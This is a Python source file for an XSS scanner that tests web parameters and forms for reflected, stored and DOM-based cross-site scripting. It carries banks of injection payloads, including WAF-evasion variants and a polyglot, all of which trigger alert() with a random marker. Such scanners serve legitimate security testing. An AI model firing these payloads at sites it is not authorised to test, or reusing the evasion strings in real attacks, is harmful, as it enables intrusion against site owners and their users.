"""
XSS Scanner — Full Rewrite
============================
Detection methods:
  1. Reflected XSS    — Payload injected and reflected in same response
  2. Stored XSS       — Payload injected, then fetched from a secondary URL
  3. DOM XSS          — Playwright renders the page and checks live DOM / JS sinks
  4. WAF evasion      — Encoded / obfuscated variants to bypass keyword filters

Key improvements over v1:
  - Stored XSS: tracks injected markers across all crawled URLs, then
    re-fetches each to check if any marker surfaced elsewhere
  - DOM XSS: uses Playwright (headless Chromium) to actually execute JS and
    inspect live DOM sinks (innerHTML, document.write, location.hash,
    postMessage, eval) — impossible to detect with requests + BeautifulSoup
  - WAF evasion: SVG/event-handler variants, HTML entity encoding,
    javascript: URI obfuscation, polyglots
  - Unique per-injection markers eliminate cross-test collisions
  - Context detection: html_body, html_attribute, javascript, url_scheme
"""
from __future__ import annotations

import random
import re
import string
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests

# Playwright is optional — DOM XSS is skipped gracefully if not installed
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False


# ---------------------------------------------------------------------------
# Payload banks
# ---------------------------------------------------------------------------

# Reflected / Stored payloads — each embeds a {MARKER} placeholder
REFLECTED_PAYLOADS: List[Tuple[str, str]] = [
    ('<script>alert("{MARKER}")</script>',              "script_tag"),
    ('<img src=x onerror=alert("{MARKER}")>',           "img_onerror"),
    ('<svg onload=alert("{MARKER}")>',                  "svg_onload"),
    ('<body onload=alert("{MARKER}")>',                 "body_onload"),
    ('"><script>alert("{MARKER}")</script>',            "attr_break_script"),
    ("'><img src=x onerror=alert('{MARKER}')>",        "attr_break_img"),
    ('<details open ontoggle=alert("{MARKER}")>',       "details_ontoggle"),
    ('<iframe srcdoc="<script>alert(\'{MARKER}\')</script>">', "iframe_srcdoc"),
]

# WAF-evasion variants
WAF_PAYLOADS: List[Tuple[str, str]] = [
    ('<ScRiPt>alert("{MARKER}")</ScRiPt>',              "case_mix"),
    ('<script/src=data:,alert("{MARKER}")>',            "script_data_uri"),
    ('<svg/onload=alert("{MARKER}")>',                  "svg_nospace"),
    ('&#60;script&#62;alert("{MARKER}")&#60;/script&#62;', "html_entities"),
    ('<img src=1 oNeRrOr=alert("{MARKER}")>',           "mixed_case_event"),
    ('<<script>alert("{MARKER}")//<</script>',         "double_open"),
    ('<input autofocus onfocus=alert("{MARKER}")>',     "autofocus_onfocus"),
    ('javascript:/*--></title></style></textarea>'
     '</script><svg onload=alert("{MARKER}")>',         "polyglot"),
]

# DOM XSS sink patterns to watch in Playwright
DOM_SINKS = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "location.href",
    "location.hash",
    "location.search",
    "postMessage",
    "src=javascript:",
]

# DOM XSS source → sink test payloads (injected via URL hash / query)
DOM_PAYLOADS: List[Tuple[str, str]] = [
    ('<img src=x onerror=alert("{MARKER}")>',   "hash_img"),
    ('<svg onload=alert("{MARKER}")>',          "hash_svg"),
    ('javascript:alert("{MARKER}")',            "hash_js_uri"),
    ('"onmouseover="alert(\'{MARKER}\')',       "attr_inject"),
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _marker() -> str:
    rnd = "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
    return f"XSS_{rnd}"


def _inject(template: str, marker: str) -> str:
    return template.replace("{MARKER}", marker)


def _detect_context(html: str, marker: str) -> str:
    """Heuristic: where in the HTML does the marker appear?"""
    script_re = re.compile(
        r"<script[^>]*>.*?" + re.escape(marker) + r".*?</script>",
        re.IGNORECASE | re.DOTALL,
    )
    if script_re.search(html):
        return "javascript"

    attr_re = re.compile(
        r'\w[\w-]*\s*=\s*["\'][^"\']*' + re.escape(marker),
        re.IGNORECASE,
    )
    if attr_re.search(html):
        return "html_attribute"

    url_re = re.compile(r'(?:href|src|action)\s*=\s*["\'][^"\']*' + re.escape(marker),
                        re.IGNORECASE)
    if url_re.search(html):
        return "url_scheme"

    return "html_body"


def _snippet(text: str, marker: str, window: int = 60) -> str:
    idx = text.find(marker)
    if idx == -1:
        return ""
    return text[max(0, idx - window): idx + window]


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

class XSSScanner:
    """
    Multi-method XSS scanner.

    Usage:
        scanner = XSSScanner(timeout=10)

        # Reflected (immediate)
        findings = scanner.scan_url(url, params)

        # After scanning all URLs, call to detect stored XSS:
        stored = scanner.check_stored(all_urls, session)
    """

    def __init__(self, timeout: int = 10,
                 session: Optional[requests.Session] = None) -> None:
        self.timeout = timeout
        self.session = session or requests.Session()
        if not session:
            self.session.headers.update({"User-Agent": "vuln-scanner/1.0"})

        # Stored XSS tracking:  marker -> {param, payload, inject_url}
        self._injected: Dict[str, Dict[str, str]] = {}

        if not PLAYWRIGHT_AVAILABLE:
            print("[XSS] Playwright not installed — DOM XSS disabled.")
            print("      Install: pip install playwright && playwright install chromium")

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def scan_url(self, url: str, params: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test GET parameters for reflected + DOM XSS."""
        findings: List[Dict[str, Any]] = []
        for param in params:
            orig = str(params[param])

            # 1. Reflected (requests-based)
            result = self._reflected(url, param, orig, params, "GET")
            if result:
                findings.append(result)
                continue  # skip DOM test if already confirmed

            # 2. DOM XSS via Playwright
            if PLAYWRIGHT_AVAILABLE:
                result = self._dom_xss(url, param, orig, params)
                if result:
                    findings.append(result)

        return findings

    def scan_form(self, form_data: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test form inputs for reflected XSS (and register for stored check)."""
        findings: List[Dict[str, Any]] = []
        action = form_data.get("action")
        method = (form_data.get("method") or "GET").upper()
        inputs = form_data.get("inputs", [])

        if not action or not inputs:
            return findings

        baseline = {inp["name"]: "" for inp in inputs if inp.get("name")}

        for param in baseline:
            orig = baseline[param]
            result = self._reflected(action, param, orig, baseline, method)
            if result:
                findings.append(result)

        return findings

    def check_stored(self, all_urls: List[str],
                     session: Optional[requests.Session] = None) -> List[Dict[str, Any]]:
        """
        After all injections are done, re-fetch every known URL and look for
        any previously injected markers surfacing in a different response.

        Call this once after all scan_url / scan_form calls complete.
        """
        if not self._injected:
            return []

        findings: List[Dict[str, Any]] = []
        sess = session or self.session
        print(f"[XSS] Checking {len(all_urls)} URLs for stored XSS "
              f"({len(self._injected)} markers tracked)...")

        for url in all_urls:
            try:
                resp = sess.get(url, timeout=self.timeout)
                text = resp.text
            except requests.RequestException:
                continue

            for marker, meta in self._injected.items():
                if marker in text and meta["inject_url"] != url:
                    context = _detect_context(text, marker)
                    snip    = _snippet(text, marker)
                    print(f"    [!] Stored XSS: injected on {meta['inject_url']}, "
                          f"reflected on {url} (param={meta['param']})")
                    findings.append({
                        "vulnerable":   True,
                        "type":         "stored-xss",
                        "param":        meta["param"],
                        "payload":      meta["payload"],
                        "inject_url":   meta["inject_url"],
                        "reflect_url":  url,
                        "evidence":     snip,
                        "context":      context,
                        "confidence":   90,
                    })

        return findings

    # ------------------------------------------------------------------
    # Detection method 1: Reflected XSS
    # ------------------------------------------------------------------

    def _reflected(self, url: str, param: str, original: str,
                   params: Dict[str, Any], method: str) -> Optional[Dict]:
        all_payloads = REFLECTED_PAYLOADS + WAF_PAYLOADS

        for template, label in all_payloads:
            mark    = _marker()
            payload = _inject(template, mark)
            injected_val = original + payload

            text = self._fetch(url, {**params, param: injected_val}, method)
            if text is None:
                continue

            if mark in text:
                context    = _detect_context(text, mark)
                exact      = payload in text
                confidence = 95 if exact else 72
                snip       = _snippet(text, mark)

                print(f"    [!] Reflected XSS on '{param}' ({label}, "
                      f"context={context})")

                # Register marker for stored XSS sweep
                self._injected[mark] = {
                    "param":      param,
                    "payload":    payload,
                    "inject_url": url,
                }

                return {
                    "vulnerable": True,
                    "type":       "reflected-xss",
                    "param":      param,
                    "payload":    payload,
                    "evidence":   snip,
                    "context":    context,
                    "confidence": confidence,
                    "url":        url,
                }

            # Even if not reflected yet, track for stored XSS
            self._injected[mark] = {
                "param":      param,
                "payload":    payload,
                "inject_url": url,
            }

        return None

    # ------------------------------------------------------------------
    # Detection method 2: DOM XSS via Playwright
    # ------------------------------------------------------------------

    def _dom_xss(self, url: str, param: str, original: str,
                 params: Dict[str, Any]) -> Optional[Dict]:
        """
        Uses Playwright (headless Chromium) to:
          1. Navigate to the page with an injected hash / query payload
          2. Listen for alert() dialogs — if one fires containing our marker,
             it's confirmed DOM XSS
          3. Also inspects document.body.innerHTML for unescaped marker
        """
        mark = _marker()

        with sync_playwright() as pw:
            browser = pw.chromium.launch(headless=True)
            page    = browser.new_page()

            dialog_fired = {"value": None}

            def _on_dialog(dialog):
                dialog_fired["value"] = dialog.message
                dialog.dismiss()

            page.on("dialog", _on_dialog)

            for template, label in DOM_PAYLOADS:
                payload = _inject(template, mark)

                # Test via URL hash (common DOM XSS source)
                test_url = f"{url}#{payload}"
                try:
                    page.goto(test_url, timeout=8000, wait_until="networkidle")
                    page.wait_for_timeout(1500)  # let JS execute
                except PWTimeout:
                    pass

                # Check if alert fired with our marker
                if dialog_fired["value"] and mark in str(dialog_fired["value"]):
                    browser.close()
                    print(f"    [!] DOM XSS via hash on '{param}' ({label}) — "
                          f"alert fired!")
                    return {
                        "vulnerable": True,
                        "type":       "dom-xss",
                        "param":      param,
                        "payload":    payload,
                        "evidence":   f"alert() fired with marker {mark}",
                        "context":    "javascript",
                        "confidence": 98,
                        "url":        test_url,
                        "sink":       "alert()",
                    }

                # Also check rendered DOM for unescaped marker
                try:
                    dom_html = page.evaluate("document.body.innerHTML")
                    if mark in dom_html:
                        context = _detect_context(dom_html, mark)
                        snip    = _snippet(dom_html, mark)
                        browser.close()
                        print(f"    [!] DOM XSS (innerHTML) on '{param}' ({label})")
                        return {
                            "vulnerable": True,
                            "type":       "dom-xss",
                            "param":      param,
                            "payload":    payload,
                            "evidence":   snip,
                            "context":    context,
                            "confidence": 88,
                            "url":        test_url,
                            "sink":       "innerHTML",
                        }
                except Exception:
                    pass

                # Test via query param
                test_url_q = f"{url}?{param}={payload}"
                try:
                    page.goto(test_url_q, timeout=8000, wait_until="networkidle")
                    page.wait_for_timeout(1500)
                except PWTimeout:
                    pass

                if dialog_fired["value"] and mark in str(dialog_fired["value"]):
                    browser.close()
                    print(f"    [!] DOM XSS via query on '{param}' ({label})")
                    return {
                        "vulnerable": True,
                        "type":       "dom-xss",
                        "param":      param,
                        "payload":    payload,
                        "evidence":   f"alert() fired with marker {mark}",
                        "context":    "javascript",
                        "confidence": 98,
                        "url":        test_url_q,
                        "sink":       "alert()",
                    }

            browser.close()
        return None

    # ------------------------------------------------------------------
    # Internals
    # ------------------------------------------------------------------

    def _fetch(self, url: str, params: Dict[str, Any],
               method: str) -> Optional[str]:
        try:
            if method.upper() == "GET":
                r = self.session.get(url,  params=params, timeout=self.timeout)
            else:
                r = self.session.post(url, data=params,   timeout=self.timeout)
            return r.text
        except requests.RequestException as exc:
            print(f"    [err] {exc}")
            return None